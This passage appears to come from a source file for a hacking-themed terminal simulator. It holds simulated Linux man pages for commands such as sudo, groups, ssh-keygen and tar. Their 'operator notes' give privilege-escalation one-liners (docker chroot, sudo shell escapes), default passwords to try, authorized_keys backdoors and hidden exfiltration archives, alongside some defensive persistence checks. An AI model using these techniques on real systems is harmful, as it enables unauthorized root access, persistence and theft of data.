       adm         - Can read logs in /var/log

       id is your first recon command. Know who you are before
       you try to become someone else.

SEE ALSO
       whoami(1), groups(1), getent(1)`,

            'whoami': `WHOAMI(1)                       User Commands                       WHOAMI(1)

NAME
       whoami - print effective userid

SYNOPSIS
       whoami [OPTION]...

DESCRIPTION
       Print the user name associated with the current effective user ID.
       Same as id -un.

EXAMPLES
       whoami
              Print current username.

OPERATOR NOTES
       Use whoami when you need to:
       • Quick check of current user context
       • Verify privilege escalation worked
       • Confirm shell identity after sudo/su

       Pro tip: whoami is simpler than id but gives less info.
       Use id for full context, whoami for quick checks.
       After exploitation: whoami && id && pwd

SEE ALSO
       id(1), who(1), w(1)`,

            'groups': `GROUPS(1)                       User Commands                       GROUPS(1)

NAME
       groups - print the groups a user is in

SYNOPSIS
       groups [OPTION]... [USERNAME]...

DESCRIPTION
       Print group memberships for each USERNAME or, if no USERNAME is
       specified, for the current process.

EXAMPLES
       groups
              Show groups for current user.

       groups root
              Show what groups root belongs to.

       groups admin www-data
              Show groups for multiple users.

PRIVILEGED GROUPS
       sudo / wheel    - Can execute commands as root via sudo
       docker          - Can spawn root containers (privesc vector)
       lxd             - Can spawn root containers (privesc vector)
       disk            - Raw disk read/write access
       adm             - Read access to /var/log
       shadow          - Read access to /etc/shadow
       video           - Access to framebuffer/video devices
       plugdev         - Mount removable devices

OPERATOR NOTES
       Use groups when you need to:
       • Enumerate current privileges quickly
       • Check if user is in exploitable groups
       • Identify privilege escalation paths via group membership

       Pro tip: docker and lxd groups are instant root:
       docker run -v /:/mnt --rm -it alpine chroot /mnt sh
       This mounts the host filesystem and gives root shell.

       Always check: groups | grep -E "(sudo|wheel|docker|lxd|disk)"

SEE ALSO
       id(1), getent(1), usermod(8)`,

            'sudo': `SUDO(8)                   System Manager's Manual                   SUDO(8)

NAME
       sudo - execute a command as another user

SYNOPSIS
       sudo -l
       sudo [-u user] command
       sudo -i
       sudo -s

DESCRIPTION
       sudo allows a permitted user to execute a command as the superuser
       or another user, as specified by the security policy.

       -l, --list
              List the allowed (and forbidden) commands for the invoking
              user on the current host.

       -u user, --user=user
              Run the command as user instead of root.

       -i, --login
              Run the shell as a login shell (loads user's environment).

       -s, --shell
              Run the shell specified by the SHELL environment variable.

       -k, --reset-timestamp
              Invalidate the user's cached credentials.

EXAMPLES
       sudo -l
              Show what commands you can run as root (CRITICAL first step).

       sudo cat /etc/shadow
              Read shadow file as root.

       sudo -u www-data whoami
              Execute command as www-data user.

       sudo -i
              Get interactive root shell.

       sudo !!
              Re-run last command with sudo.

PRIVILEGE ESCALATION
       sudo -l output reveals escalation paths:

       (ALL) NOPASSWD: /usr/bin/vim
              vim can spawn shell: :!/bin/bash

       (ALL) NOPASSWD: /usr/bin/less /var/log/*
              less can spawn shell: !sh

       (ALL) NOPASSWD: /usr/bin/find
              find can spawn shell: find . -exec /bin/sh \\; -quit

       (ALL) NOPASSWD: /usr/bin/python3 *
              python can spawn shell: import os; os.system("/bin/bash")

       NOPASSWD means no password required - instant escalation.
       Check GTFOBins for exploitation techniques per binary.

OPERATOR NOTES
       Use sudo when you need to:
       • Execute commands with elevated privileges
       • Enumerate what you can run as root (sudo -l)
       • Pivot through sudo misconfigurations

       Pro tip: sudo -l is ALWAYS your first privesc check.
       Look for:
       • NOPASSWD entries (no password needed)
       • Wildcards in paths (/usr/bin/*)
       • Text editors, interpreters, file viewers
       • Commands you control the arguments to

       Dangerous sudo entries (instant root):
       vim, nano, less, more, man, awk, find, python, perl, ruby, bash

SEE ALSO
       su(1), sudoers(5), visudo(8)`,

            'su': `SU(1)                           User Commands                          SU(1)

NAME
       su - run a command with substitute user and group ID

SYNOPSIS
       su [options] [-] [user [argument...]]

DESCRIPTION
       su allows to run commands with a substitute user and group ID.

       When called without arguments, su defaults to running an interactive
       shell as root.

       -, -l, --login
              Start the shell as a login shell (clean environment).

       -c, --command=command
              Pass command to the shell with -c.

       -s, --shell=shell
              Run the specified shell instead of the default.

EXAMPLES
       su
              Switch to root (requires root password).

       su -
              Switch to root with login shell (clean environment).

       su - admin
              Switch to admin user with login shell.

       su -c "cat /etc/shadow" root
              Run single command as root.

       su -s /bin/bash www-data
              Switch to www-data using bash shell.

SU VS SUDO
       su requires the TARGET user's password
       sudo requires YOUR password (if configured)

       su -           Needs root password, gives root shell
       sudo -i        Needs your password (if in sudoers), gives root shell

       On most modern systems, sudo is preferred over su.

OPERATOR NOTES
       Use su when you need to:
       • Switch to another user when you know their password
       • Test access with credentials you've obtained
       • Pivot between users on a compromised system

       Pro tip: If you find credentials, try them with su:
       su - username  # Use discovered password

       Common passwords to try:
       admin, password, root, toor, administrator

       After cracking /etc/shadow, use su to test credentials.

SEE ALSO
       sudo(8), login(1), passwd(5)`,

            'getent': `GETENT(1)                       User Commands                       GETENT(1)

NAME
       getent - get entries from Name Service Switch libraries

SYNOPSIS
       getent [option]... database [key]...

DESCRIPTION
       The getent command displays entries from databases supported by the
       Name Service Switch libraries. These databases include passwd, group,
       hosts, services, protocols, and networks.

       If one or more key arguments are provided, only entries matching
       the specified keys are displayed.

DATABASES
       passwd     User account information (/etc/passwd + LDAP/NIS)
       group      Group information (/etc/group + LDAP/NIS)
       shadow     Password hashes (requires root)
       hosts      Host name resolution (/etc/hosts + DNS)
       services   Network services (/etc/services)
       protocols  Network protocols (/etc/protocols)

EXAMPLES
       getent passwd
              List all users (local + network).

       getent passwd admin
              Get passwd entry for user 'admin'.

       getent group sudo
              Get group entry for 'sudo' group.

       getent hosts localhost
              Resolve hostname.

OUTPUT FORMAT (passwd)
       username:x:uid:gid:gecos:home:shell

       Example:
       admin:x:1000:1000:Administrator:/home/admin:/bin/bash
       │     │ │    │    │             │           └── login shell
       │     │ │    │    │             └── home directory
       │     │ │    │    └── GECOS (full name/comment)
       │     │ │    └── primary group ID
       │     │ └── user ID
       │     └── password placeholder (actual hash in /etc/shadow)
       └── username

OPERATOR NOTES
       Use getent when you need to:
       • List users from all sources (local + LDAP/AD)
       • Look up specific user account details
       • Verify user exists in the system
       • Check group memberships

       Pro tip: getent vs cat /etc/passwd:
       • cat only shows LOCAL users
       • getent shows ALL users (local + LDAP + NIS + AD)
       Essential for networks with centralized authentication!

       Useful commands:
       getent passwd | cut -d: -f1          # All usernames
       getent passwd | grep -v nologin      # Users with shells
       getent group sudo                    # Who can sudo?

SEE ALSO
       passwd(5), group(5), nsswitch.conf(5)`,

            'getfacl': `GETFACL(1)                     Access Control Lists                   GETFACL(1)

NAME
       getfacl - get file access control lists

SYNOPSIS
       getfacl [-aceEsRLPtpndvh] file ...

DESCRIPTION
       For each file, getfacl displays the file name, owner, the group,
       and the Access Control List (ACL). If a directory has a default
       ACL, getfacl also displays the default ACL.

       ACLs extend standard Unix permissions (rwx for user/group/other)
       to allow fine-grained access control for specific users and groups.

       -a, --access
              Display the file access control list.

       -d, --default
              Display the default access control list.

       -R, --recursive
              List ACLs of all files and directories recursively.

OUTPUT FORMAT
       # file: filename
       # owner: username
       # group: groupname
       user::rwx              (owner permissions)
       user:bob:rw-           (specific user 'bob' has rw)
       group::r-x             (owning group permissions)
       group:devs:rwx         (specific group 'devs' has rwx)
       mask::rwx              (maximum permissions for named users/groups)
       other::r--             (everyone else)

EXAMPLES
       getfacl file.txt
              Display ACL for file.txt.

       getfacl -R /var/www
              Recursively show ACLs for web directory.

       getfacl /etc/shadow
              Check who has access to shadow file.

OPERATOR NOTES
       Use getfacl when you need to:
       • Investigate why a user can access a file despite permissions
       • Audit fine-grained access controls
       • Find hidden access grants not visible with ls -l

       Pro tip: Standard ls -l doesn't show ACLs. A + at the end of
       permissions (drwxr-xr-x+) indicates ACLs are set.

       Hidden backdoor technique: Attackers may add ACL entries to
       grant themselves access while permissions look normal.

       Check critical files: getfacl /etc/passwd /etc/shadow /etc/sudoers

SEE ALSO
       setfacl(1), chmod(1), chown(1)`,

            // Network
            'ifconfig': `IFCONFIG(8)             System Manager's Manual            IFCONFIG(8)

NAME
       ifconfig - configure a network interface

SYNOPSIS
       ifconfig [-v] [-a] [-s] [interface]
       ifconfig [-v] interface [aftype] options | address ...

DESCRIPTION
       Ifconfig is used to configure the kernel-resident network interfaces.

       Note: This program is obsolete! For replacement check ip addr and ip link.

EXAMPLES
       ifconfig
              Display all active interfaces.

       ifconfig -a
              Display all interfaces including inactive.

       ifconfig eth0
              Display specific interface.

       ifconfig eth0 up
              Bring interface up.

       ifconfig eth0 192.168.1.10 netmask 255.255.255.0
              Set IP address.

SEE ALSO
       ip(8), route(8), netstat(8)`,

            'ip': `IP(8)                          Linux                                  IP(8)

NAME
       ip - show / manipulate routing, network devices, interfaces and tunnels

SYNOPSIS
       ip [ OPTIONS ] OBJECT { COMMAND | help }

OBJECTS
       address  - protocol (IP or IPv6) address on a device.
       link     - network device.
       route    - routing table entry.
       neigh    - ARP or NDISC cache entry.

EXAMPLES
       ip addr
              Show all addresses.

       ip addr show eth0
              Show addresses for eth0.

       ip link show
              Show all interfaces.

       ip route
              Show routing table.

       ip neigh
              Show ARP cache.

       ip addr add 192.168.1.10/24 dev eth0
              Add IP address to interface.

SEE ALSO
       ifconfig(8), route(8)`,

            'netstat': `NETSTAT(8)              System Manager's Manual             NETSTAT(8)

NAME
       netstat - Print network connections, routing tables, interface statistics

SYNOPSIS
       netstat  [address_family_options]  [--tcp|-t]  [--udp|-u]  [--raw|-w]
                [--listening|-l]  [--all|-a]  [--numeric|-n]  [--program|-p]

DESCRIPTION
       Note: This program is mostly obsolete.  Replacement for netstat is ss.

       -a, --all
              Show both listening and non-listening sockets.

       -l, --listening
              Show only listening sockets.

       -n, --numeric
              Show numerical addresses instead of resolving hosts.

       -p, --program
              Show the PID and name of the program.

       -t, --tcp
              Show TCP connections.

       -u, --udp
              Show UDP connections.

       -r, --route
              Display the kernel routing tables.

EXAMPLES
       netstat -tuln
              Show TCP/UDP listening ports numerically.

       netstat -anp
              Show all connections with process info.

       netstat -r
              Show routing table.

SEE ALSO
       ss(8), ip(8), route(8)`,

            'ss': `SS(8)                          Linux                                  SS(8)

NAME
       ss - another utility to investigate sockets

SYNOPSIS
       ss [options] [ FILTER ]

DESCRIPTION
       ss is used to dump socket statistics. It allows showing information
       similar to netstat. It can display more TCP and state information.

       -a, --all
              Display all sockets.

       -l, --listening
              Display listening sockets.

       -n, --numeric
              Do not try to resolve service names.

       -p, --processes
              Show process using socket.

       -t, --tcp
              Display TCP sockets.

       -u, --udp
              Display UDP sockets.

EXAMPLES
       ss -tuln
              Show TCP/UDP listening sockets.

       ss -anp
              Show all sockets with process info.

       ss state established
              Show established connections.

SEE ALSO
       netstat(8), ip(8)`,

            // Services
            'systemctl': `SYSTEMCTL(1)                     systemctl                     SYSTEMCTL(1)

NAME
       systemctl - Control the systemd system and service manager

SYNOPSIS
       systemctl [OPTIONS...] COMMAND [UNIT...]

DESCRIPTION
       systemctl may be used to introspect and control the state of the
       "systemd" system and service manager. Includes managing services
       and timers.

COMMANDS
       Service Commands:
           start UNIT...             Start (activate) units
           stop UNIT...              Stop (deactivate) units
           restart UNIT...           Restart units
           status [UNIT...]          Show runtime status of units
           enable UNIT...            Enable unit to start at boot
           disable UNIT...           Disable unit from starting at boot
           list-units                List all loaded units

       Timer Commands:
           list-timers               List all timers and their schedules
           create-timer <name>       Create a new timer (opens editor)
           edit <name>.timer         Edit existing timer
           daemon-reload             Reload unit files after changes

TIMER UNIT FILES
       Timers require two files in /etc/systemd/system/:

       <name>.timer      Defines WHEN to run
       <name>.service    Defines WHAT to run

       Timer file [Timer] section options:
           OnCalendar=       Calendar-based schedule
           OnBootSec=        Time after boot
           OnUnitActiveSec=  Time after unit was last active
           Persistent=true   Run if missed while system was off

ONCALENDAR SYNTAX
       minutely           Every minute
       hourly             Every hour at :00
       daily              Every day at 00:00
       weekly             Every Monday at 00:00
       monthly            First day of month at 00:00
       *:0/15             Every 15 minutes
       *-*-* 03:00:00     Every day at 3 AM
       Mon *-*-* 09:00    Every Monday at 9 AM
       *-*-01 00:00:00    First of every month

EXAMPLES
       systemctl list-timers
              Show all scheduled timers.

       systemctl create-timer backup
              Create backup.timer and backup.service.

       systemctl status backup.timer
              Check timer status.

       systemctl enable --now backup.timer
              Enable and start a timer.

TIMER WORKFLOW
       1. systemctl create-timer <name>
       2. Edit OnCalendar schedule and ExecStart command
       3. Save (auto-enables the timer)
       4. Verify: systemctl list-timers

OPERATOR NOTES
       Use systemctl when you need to:
       • Manage services (start, stop, restart)
       • Create scheduled tasks with timers
       • Check service/timer status and health
       • Investigate what's running on the system

       Pro tip: Timers are the modern replacement for cron.
       systemctl list-timers --all  # Show all timers including inactive
       ls /etc/systemd/system/*.timer  # Find timer unit files

       Persistence check: Attackers may create rogue timers.
       Always review /etc/systemd/system/ for unfamiliar units.

SEE ALSO
       systemd(1), journalctl(1), crontab(1), at(1)`,

            'crontab': `CRONTAB(1)                      User Commands                      CRONTAB(1)

NAME
       crontab - maintain crontab files for individual users

SYNOPSIS
       crontab [-u user] file
       crontab [-u user] [-l | -r | -e]

DESCRIPTION
       crontab is the program used to install, remove, or list the tables
       used to schedule periodic jobs with the cron daemon.

       Each user can have their own crontab, and the crontab files are
       stored in /var/spool/cron/crontabs/.

OPTIONS
       -l     Display the current crontab on standard output.

       -r     Remove the current crontab.

       -e     Edit the current crontab using the default editor.
              After you exit the editor, the modified crontab is installed.

       -u user
              Specify the user whose crontab is to be modified (root only).

CRON ENTRY FORMAT
       A cron entry consists of 5 time fields followed by a command:

       ┌───────────── minute (0 - 59)
       │ ┌───────────── hour (0 - 23)
       │ │ ┌───────────── day of month (1 - 31)
       │ │ │ ┌───────────── month (1 - 12)
       │ │ │ │ ┌───────────── day of week (0 - 6) (Sunday = 0)
       │ │ │ │ │
       * * * * * command to execute

SPECIAL CHARACTERS
       *      Match any value (wildcard).
       ,      Specify multiple values (e.g., 1,3,5).
       -      Specify a range (e.g., 1-5).
       /      Step values (e.g., */5 means every 5 units).

EXAMPLES
       # Run backup.sh every day at 2:30 AM
       30 2 * * * /opt/scripts/backup.sh

       # Run cleanup every Monday at 6:00 AM
       0 6 * * 1 /opt/scripts/cleanup.sh

       # Run health check every 15 minutes
       */15 * * * * /opt/scripts/health_check.sh

       # Run report on 1st of every month at midnight
       0 0 1 * * /opt/scripts/monthly_report.sh

       # Run task every weekday (Mon-Fri) at 9:00 AM
       0 9 * * 1-5 /opt/scripts/daily_task.sh

COMMON SCHEDULES
       @reboot     Run once at startup
       @hourly     Equivalent to: 0 * * * *
       @daily      Equivalent to: 0 0 * * *
       @weekly     Equivalent to: 0 0 * * 0
       @monthly    Equivalent to: 0 0 1 * *

OPERATOR NOTES
       Use crontab when you need to:
       • Schedule recurring tasks (backups, log rotation, monitoring)
       • Set up persistence mechanisms
       • Automate data collection at specific intervals
       • Run scripts outside business hours

       Pro tip: Attackers often abuse cron for persistence.
       Review crontabs regularly:
           crontab -l              # Your crontab
           cat /etc/cron.d/*       # System cron jobs
           ls -la /etc/cron.*      # Periodic directories

       Key persistence locations to monitor:
       • /var/spool/cron/crontabs/  (user crontabs)
       • /etc/cron.d/               (system cron jobs)
       • /etc/cron.hourly/, daily/, weekly/, monthly/

       Remember: cron jobs run with limited environment variables.
       Always use full paths to commands in your scripts.

SEE ALSO
       cron(8), anacron(8), at(1)`,

            'at': `AT(1)                           User Commands                          AT(1)

NAME
       at, atq, atrm - queue, examine, or delete jobs for later execution

SYNOPSIS
       at [-f file] [-mldbv] TIME
       atq [-V]
       atrm job [job...]

DESCRIPTION
       at schedules commands to be executed once at a specified time.
       Unlike cron, at jobs run only once and are then removed.

       atq lists the user's pending at jobs.
       atrm deletes at jobs by job number.

TIME SPECIFICATION
       at accepts various time formats:

       now + COUNT UNIT
              Relative time (minutes, hours, days, weeks)
              Example: now + 30 minutes
              Example: now + 2 hours

       HH:MM [AM|PM]
              Specific time (runs today or tomorrow)
              Example: 3:00 PM
              Example: 14:30

       midnight, noon, teatime
              Named times (00:00, 12:00, 16:00)

       tomorrow
              Same time tomorrow

       MMDDYY or MM/DD/YY
              Specific date

EXAMPLES
       at now + 10 minutes
              Schedule a job to run in 10 minutes.

       at 3:00 AM
              Schedule a job for 3:00 AM.

       at midnight
              Schedule a job for midnight.

       at noon tomorrow
              Schedule a job for noon tomorrow.

       atq
              List pending at jobs.

       atrm 5
              Remove job number 5.

WORKFLOW
       1. Run: at <time>
       2. Enter commands in the editor
       3. Submit the job
       4. View queue: atq
       5. Remove if needed: atrm <job_id>

OPERATOR NOTES
       Use at when you need to:
       • Schedule one-time tasks (data exfiltration timing)
       • Set up delayed execution
       • Run cleanup tasks after a specific interval
       • Schedule reconnaissance during off-hours

       Pro tip: at jobs are stored in /var/spool/at/ (or /var/spool/cron/atjobs).
       Unlike cron, at is for one-shot tasks.

       Persistence check: atq shows all pending one-time jobs.
       Attackers may use at for time-delayed payloads.

SEE ALSO
       atq(1), atrm(1), crontab(1), cron(8)`,

            // Editors
            'vim': `VIM(1)                          User Commands                         VIM(1)

NAME
       vim - Vi IMproved, a programmer's text editor

SYNOPSIS
       vim [options] [file ..]

DESCRIPTION
       Vim is an improved version of the vi editor. It has many improvements:
       multi level undo, multi windows, syntax highlighting, command line
       editing, and much more.

MODES
       Normal mode    Navigate and manipulate text (default mode).
       Insert mode    Enter text (press i, a, o to enter).
       Visual mode    Select text (press v to enter).
       Command mode   Execute commands (press : to enter).

BASIC COMMANDS
       i              Enter insert mode.
       Esc            Return to normal mode.
       :w             Write (save) file.
       :q             Quit (fails if unsaved changes).
       :q!            Quit without saving.
       :wq or ZZ      Write and quit.

MOVEMENT
       h j k l        Left, down, up, right.
       w b            Forward/backward by word.
       0 $            Start/end of line.
       gg G           Start/end of file.

EDITING
       x              Delete character.
       dd             Delete line.
       yy             Yank (copy) line.
       p              Paste after cursor.
       u              Undo.
       Ctrl+r         Redo.

SEARCH
       /pattern       Search forward.
       ?pattern       Search backward.
       n N            Next/previous match.

OPERATOR NOTES
       Use vim when you need to:
       • Edit configuration files on remote systems
       • Make quick changes without a GUI
       • Work efficiently through keyboard-only access
       • Survive when nano isn't available

       Pro tip: vim is the operator's editor - learn it or suffer.
       Minimum survival kit:
       1. i    → Enter insert mode, type your changes
       2. Esc  → Return to normal mode
       3. :wq  → Save and quit
       4. :q!  → Quit without saving (escape hatch)

       "How do I exit vim?" - The eternal question.
       Answer: Esc, then :q! (always works)

SEE ALSO
       vi(1), nano(1), emacs(1)`,

            'nano': `NANO(1)                         User Commands                        NANO(1)

NAME
       nano - Nano's ANOther editor, inspired by Pico

SYNOPSIS
       nano [OPTIONS] [[+LINE[,COLUMN]] FILE]...

DESCRIPTION
       nano is a small and friendly editor.

KEY BINDINGS
       ^G     Display help text.
       ^X     Close the current buffer / Exit from nano.
       ^O     Write the current buffer (or marked region) to disk.
       ^R     Insert another file into the current buffer.
       ^W     Search forward for a string or regular expression.

       ^K     Cut the current line and store it in the cutbuffer.
       ^U     Uncut (paste) from the cutbuffer into the current line.
       ^J     Justify the current paragraph.

       ^Y     Go one screenful up.
       ^V     Go one screenful down.

       ^A     Go to beginning of current line.
       ^E     Go to end of current line.

EXAMPLES
       nano file.txt
              Edit file.txt.

       nano +10 file.txt
              Open at line 10.

OPERATOR NOTES
       Use nano when you need to:
       • Edit files with minimal learning curve
       • Make quick config changes
       • Introduce beginners to command-line editing
       • When vim feels like overkill

       Pro tip: nano is beginner-friendly but less powerful than vim.
       Key commands shown at bottom of screen (^ means Ctrl).
       ^O = Save (Write Out), ^X = Exit
       ^W = Search, ^K = Cut line, ^U = Paste

       On some systems, nano isn't installed but vim always is.
       Learn vim basics as your backup editor.

SEE ALSO
       vim(1), emacs(1)`,

            // SSH/Remote
            'ssh': `SSH(1)                      BSD General Commands Manual                     SSH(1)

NAME
     ssh -- OpenSSH remote login client

SYNOPSIS
     ssh [-46AaCfGgKkMNnqsTtVvXxYy] [-B bind_interface] [-b bind_address]
         [-c cipher_spec] [-D [bind_address:]port] [-E log_file]
         [-e escape_char] [-F configfile] [-I pkcs11] [-i identity_file]
         [-J destination] [-L address] [-l login_name] [-m mac_spec]
         [-O ctl_cmd] [-o option] [-p port] [-Q query_option] [-R address]
         [-S ctl_path] [-W host:port] [-w local_tun[:remote_tun]]
         destination [command [argument ...]]

DESCRIPTION
     ssh is a program for logging into a remote machine and for executing
     commands on a remote machine.

     -i identity_file
             Selects a file from which the identity (private key) is read.

     -l login_name
             Specifies the user to log in as on the remote machine.

     -p port
             Port to connect to on the remote host.

     -v      Verbose mode. Causes ssh to print debugging messages.

EXAMPLES
     ssh user@hostname
             Connect to hostname as user.

     ssh -p 2222 user@hostname
             Connect on non-standard port.

     ssh -i ~/.ssh/id_rsa user@host
             Use specific key file.

     ssh user@host 'ls -la'
             Execute command on remote host.

OPERATOR NOTES
     Use ssh when you need to:
     • Securely connect to remote systems
     • Execute commands remotely
     • Create encrypted tunnels
     • Transfer files securely (with scp)

     Pro tip: ssh is the primary tool for remote access.
     ssh -L 8080:internal:80 user@jump  # Local port forward
     ssh -D 9050 user@host              # SOCKS proxy
     ssh -J jump@jumphost user@target   # Jump through bastion

     Key security: Check ~/.ssh/known_hosts for connections.
     Compromised keys can grant persistent access.
     Look for authorized_keys backdoors in ~/.ssh/

SEE ALSO
     scp(1), sftp(1), ssh-keygen(1), ssh_config(5)`,

            'scp': `SCP(1)                      BSD General Commands Manual                     SCP(1)

NAME
     scp -- secure copy (remote file copy program)

SYNOPSIS
     scp [-346BCpqrTv] [-c cipher] [-F ssh_config] [-i identity_file]
         [-J destination] [-l limit] [-o ssh_option] [-P port]
         [-S program] source ... target

DESCRIPTION
     scp copies files between hosts on a network.

     -P port
             Specifies the port to connect to on the remote host.

     -r      Recursively copy entire directories.

     -i identity_file
             Selects the file from which the identity (private key) is read.

EXAMPLES
     scp file.txt user@remote:/path/
             Copy local file to remote.

     scp user@remote:/path/file.txt ./
             Copy remote file to local.

     scp -r directory/ user@remote:/path/
             Copy directory recursively.

     scp -P 2222 file.txt user@host:/path/
             Copy using non-standard port.

OPERATOR NOTES
     Use scp when you need to:
     • Securely transfer evidence files during incident response
     • Exfiltrate logs or artifacts for offline analysis
     • Deploy tools or scripts to remote systems
     • Back up critical files before forensic analysis

     Pro tip: scp uses SSH for transport - same keys, same security:
     scp -i ~/.ssh/id_rsa evidence.tar user@analyst:/cases/   # Use specific key
     scp -r /var/log/ user@siem:/incoming/                    # Full log grab
     scp user@compromised:/etc/shadow ./evidence/             # Pull for analysis
     For large transfers, consider rsync (has resume capability)

SEE ALSO
     ssh(1), sftp(1), rsync(1)`,

            'ssh-keygen': `SSH-KEYGEN(1)            BSD General Commands Manual           SSH-KEYGEN(1)

NAME
     ssh-keygen - authentication key generation, management and conversion

SYNOPSIS
     ssh-keygen [-t type] [-b bits] [-f keyfile] [-C comment] [-N passphrase]

DESCRIPTION
     ssh-keygen generates, manages and converts authentication keys for SSH.
     It can create RSA, ECDSA, or Ed25519 keys.

OPTIONS
     -t type
             Specifies the type of key to create:
             rsa      RSA key (default, widely compatible)
             ecdsa    ECDSA key (faster, smaller)
             ed25519  Ed25519 key (modern, recommended)

     -b bits
             Specifies the number of bits in the key:
             RSA:     2048, 4096 (4096 recommended)
             ECDSA:   256, 384, 521

     -f filename
             Specifies the filename of the key file.

     -C comment
             Provides a comment (usually email or description).

     -N passphrase
             Provides the new passphrase (empty string = no passphrase).

     -p      Change passphrase of existing key file.

     -y      Read private key and print public key.

     -l      Show fingerprint of specified key file.

     -R hostname
             Removes all keys belonging to hostname from known_hosts.

KEY FILES
     ~/.ssh/id_rsa        RSA private key
     ~/.ssh/id_rsa.pub    RSA public key
     ~/.ssh/id_ed25519    Ed25519 private key
     ~/.ssh/id_ed25519.pub Ed25519 public key
     ~/.ssh/known_hosts   Known host keys
     ~/.ssh/authorized_keys  Keys allowed to connect (on server)

EXAMPLES
     ssh-keygen
             Generate default RSA key (interactive).

     ssh-keygen -t ed25519 -C "user@example.com"
             Generate Ed25519 key with comment.

     ssh-keygen -t rsa -b 4096 -f ~/.ssh/mykey
             Generate 4096-bit RSA key with custom name.

     ssh-keygen -l -f ~/.ssh/id_rsa.pub
             Show fingerprint of public key.

     ssh-keygen -p -f ~/.ssh/id_rsa
             Change passphrase on existing key.

     ssh-keygen -y -f ~/.ssh/id_rsa > ~/.ssh/id_rsa.pub
             Regenerate public key from private key.

     ssh-keygen -R hostname
             Remove host from known_hosts (after server reinstall).

OPERATOR NOTES
     Use ssh-keygen when you need to:
     • Generate keys for passwordless SSH access
     • Create keys for persistence/backdoor access
     • Verify key fingerprints
     • Manage known_hosts

     Pro tip: For persistence, add your public key to target's authorized_keys:
     echo "your_public_key" >> ~/.ssh/authorized_keys

     Check for existing keys: ls -la ~/.ssh/
     Key files to exfiltrate: id_rsa (private - most valuable!)

     Forensic check: Look at authorized_keys for unauthorized keys.
     Attackers often add their own keys for persistent access.

SEE ALSO
     ssh(1), scp(1), ssh-agent(1)`,

            'traceroute': `TRACEROUTE(8)           System Manager's Manual           TRACEROUTE(8)

NAME
     traceroute - print the route packets trace to network host

SYNOPSIS
     traceroute [-dnrvx] [-m max_ttl] [-p port] [-q nqueries]
                [-s src_addr] [-w waittime] host [packetsize]

DESCRIPTION
     traceroute utilizes the IP protocol time-to-live field and attempts
     to elicit an ICMP TIME_EXCEEDED response from each gateway along the
     path to a host.

OPTIONS
     -n      Do not resolve IP addresses to hostnames.

     -m max_ttl
             Set the max time-to-live (max number of hops) used in outgoing
             probe packets. Default is 30.

     -q nqueries
             Set the number of probes per hop. Default is 3.

     -w waittime
             Set the time (in seconds) to wait for a response. Default is 5.

     -p port
             Set the destination port number.

     -I      Use ICMP ECHO instead of UDP datagrams.

EXAMPLES
     traceroute google.com
             Trace route to Google's servers.

     traceroute -n 192.168.1.1
             Trace route without DNS resolution (faster).

     traceroute -m 15 host
             Limit to 15 hops max.

     traceroute -I host
             Use ICMP instead of UDP.

OUTPUT FORMAT
     traceroute to host (1.2.3.4), 30 hops max, 60 byte packets
      1  gateway (192.168.1.1)  0.534 ms  0.432 ms  0.389 ms
      2  isp-router (10.0.0.1)  12.543 ms  11.234 ms  10.983 ms
      3  * * *
      4  destination (1.2.3.4)  25.123 ms  24.567 ms  24.234 ms

     Each line shows: hop number, hostname (IP), three response times.
     * * * means no response (filtered/timeout).

OPERATOR NOTES
     Use traceroute when you need to:
     • Map network topology and path to targets
     • Identify intermediate routers and firewalls
     • Diagnose network connectivity issues
     • Understand network segmentation

     Pro tip: * * * responses often indicate:
     • Firewall blocking ICMP/UDP
     • Router configured not to respond
     • Network ACLs

     Try traceroute -I (ICMP) if UDP is blocked.

     Network recon: traceroute reveals internal network structure.
     Document all hops during reconnaissance phase.

SEE ALSO
     ping(8), netstat(8), mtr(8)`,

            // Archive/Transfer
            'tar': `TAR(1)                          User Commands                         TAR(1)

NAME
       tar - an archiving utility

SYNOPSIS
       tar [OPTION...] [FILE]...

DESCRIPTION
       GNU tar is an archiving program designed to store multiple files
       in a single file (an archive), and to manipulate such archives.

COMMON OPTIONS
       -c, --create
              create a new archive

       -x, --extract
              extract files from an archive

       -t, --list
              list the contents of an archive

       -v, --verbose
              verbosely list files processed

       -f, --file=ARCHIVE
              use archive file (REQUIRED for most operations)

       -z, --gzip
              filter through gzip (for .tar.gz / .tgz)

       -j, --bzip2
              filter through bzip2 (for .tar.bz2)

       -C, --directory=DIR
              change to directory DIR before performing operations

EXAMPLES
       tar -czvf archive.tar.gz directory/
              Create gzipped archive.

       tar -xzvf archive.tar.gz
              Extract gzipped archive.

       tar -xzvf archive.tar.gz -C /tmp/
              Extract to specific directory.

       tar -tzvf archive.tar.gz
              List contents without extracting.

       tar -czvf backup.tar.gz /etc /home
              Archive multiple directories.

COMMON EXTENSIONS
       .tar        Uncompressed archive
       .tar.gz     Gzip compressed (most common)
       .tgz        Same as .tar.gz
       .tar.bz2    Bzip2 compressed (better ratio, slower)
       .tar.xz     XZ compressed (best ratio, slowest)

OPERATOR NOTES
       Use tar when you need to:
       • Package files for exfiltration
       • Create backups before modification
       • Extract downloaded tools/exploits

       Pro tip: Exfiltration staging:
       tar -czvf /tmp/.data.tar.gz /home/user/Documents /etc/passwd
       Dot-prefix hides from casual ls.

       Quick extract common archives:
       tar -xvf file.tar
       tar -xzvf file.tar.gz
       tar -xjvf file.tar.bz2

SEE ALSO
       gzip(1), bzip2(1), zip(1)`,

            'gzip': `GZIP(1)                         User Commands                        GZIP(1)

NAME
       gzip, gunzip - compress or expand files

SYNOPSIS
       gzip [OPTION]... [FILE]...
       gunzip [OPTION]... [FILE]...

DESCRIPTION
       gzip reduces the size of the named files using Lempel-Ziv coding (LZ77).
       Each file is replaced by one with the extension .gz, maintaining
       ownership, modes, and timestamps.

       gunzip decompresses files created by gzip.

OPTIONS
       -c, --stdout
              Write on standard output, keep original files unchanged.

       -d, --decompress
              Decompress (same as gunzip).

       -f, --force
              Force compression/decompression even if file has multiple
              links or the corresponding file already exists.

       -k, --keep
              Keep (don't delete) input files during compression.

       -l, --list
              List compressed file contents.

       -r, --recursive
              Travel the directory structure recursively.

       -v, --verbose
              Verbose output.

       -1 to -9
              Regulate compression speed: -1 fastest, -9 best compression.

EXAMPLES
       gzip file.txt
              Compress file.txt → file.txt.gz (original deleted).

       gzip -k file.txt
              Compress and keep original.

       gzip -d file.txt.gz
              Decompress (same as gunzip file.txt.gz).

       gzip -c file.txt > file.txt.gz
              Compress to stdout, keep original.

       gzip -l file.txt.gz
              Show compression info.

       gzip -r directory/
              Recursively compress all files in directory.

OPERATOR NOTES
       Use gzip when you need to:
       • Compress files before transfer (faster exfil)
       • Decompress downloaded archives
       • Reduce log file sizes

